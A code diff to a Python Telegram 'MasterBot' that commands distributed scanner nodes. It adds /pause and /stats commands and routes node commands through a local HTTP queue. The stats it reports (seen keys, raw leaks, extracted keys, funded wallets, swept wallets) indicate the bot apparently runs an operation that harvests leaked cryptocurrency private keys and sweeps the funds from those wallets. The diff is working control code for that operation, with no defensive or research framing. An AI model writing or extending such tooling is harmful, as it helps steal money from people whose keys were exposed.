@@ -104,8 +104,10 @@ class MasterBot:
             "/restart": self._cmd_restart,
             "/sync": self._cmd_sync,
             "/scan": self._cmd_scan,
+            "/pause": self._cmd_pause,
             "/config": self._cmd_config,
             "/deploy": self._cmd_deploy,
+            "/stats": self._cmd_stats,
         }
 
         handler = handlers.get(cmd)
@@ -161,13 +163,42 @@ class MasterBot:
 /status <node> — Detailed node status
 /start <node> — Start scanner on node
 /stop <node> — Stop scanner on node
+/pause <node> — Pause scanner (graceful)
 /restart <node> — Restart scanner on node
 /sync <node> — Git pull + restart
 /scan <node> — Run single scan cycle
+/stats — Global scan statistics
 /config <node> key=value — Update config
 /deploy — Deploy to all nodes
 /help — Show this help"""
         await self._send_to(chat_id, help_text)
+
+    async def _cmd_pause(self, chat_id: str, args: str):
+        node_id = args.strip()
+        if not node_id:
+            await self._send_to(chat_id, "Usage: /pause <node_id>")
+            return
+        await self._send_command_to_node(node_id, CommandType.STOP, {"graceful": True}, chat_id)
+
+    async def _cmd_stats(self, chat_id: str, args: str):
+        """Show global stats from master API."""
+        try:
+            async with httpx.AsyncClient(timeout=5) as client:
+                resp = await client.get("http://localhost:8420/api/stats")
+                if resp.status_code == 200:
+                    data = resp.json()
+                    text = f"""Global Stats:
+Seen Keys: {data.get('seen_keys', 0)}
+Raw Leaks: {data.get('raw_leaks', 0)}
+Extracted Keys: {data.get('extracted_keys', 0)}
+Funded Wallets: {data.get('funded_wallets', 0)}
+Swept Wallets: {data.get('swept_wallets', 0)}
+Active Nodes: {data.get('active_nodes', 0)}"""
+                    await self._send_to(chat_id, text)
+                else:
+                    await self._send_to(chat_id, "Failed to fetch stats from API.")
+        except Exception as exc:
+            await self._send_to(chat_id, f"Error: {exc}")
 
     async def _cmd_nodes(self, chat_id: str, args: str):
         if not self.nodes:
@@ -250,20 +281,24 @@ class MasterBot:
     # --- Helpers ---
 
     async def _send_command_to_node(self, node_id: str, command: CommandType, payload: dict, chat_id: str):
-        """Send command to a node via Telegram."""
+        """Send command to a node via HTTP API command queue."""
         if node_id not in self.nodes:
             await self._send_to(chat_id, f"Node '{node_id}' not found.")
             return
 
-        msg = NodeMessage(
-            msg_type=MessageType.COMMAND,
-            node_id=node_id,
-            payload={"command": command.value, **payload},
-        )
-        # Nodes receive commands by polling their own messages
-        # Master sends command to the channel so node can see it
-        await self._send_message(f"[1ai-cmd]\n{msg.to_telegram()}")
-        await self._send_to(chat_id, f"Command '{command.value}' sent to {node_id}")
+        try:
+            async with httpx.AsyncClient(timeout=5) as client:
+                resp = await client.post("http://localhost:8420/api/commands", json={
+                    "node_id": node_id,
+                    "command": command.value,
+                    "payload": payload,
+                })
+                if resp.status_code == 200:
+                    await self._send_to(chat_id, f"Command '{command.value}' queued for {node_id}")
+                else:
+                    await self._send_to(chat_id, f"Failed to queue command: {resp.text}")
+        except Exception as exc:
+            await self._send_to(chat_id, f"Error: {exc}")
 
     async def _send_message(self, text: str):
         """Send message to all authorized chats."""
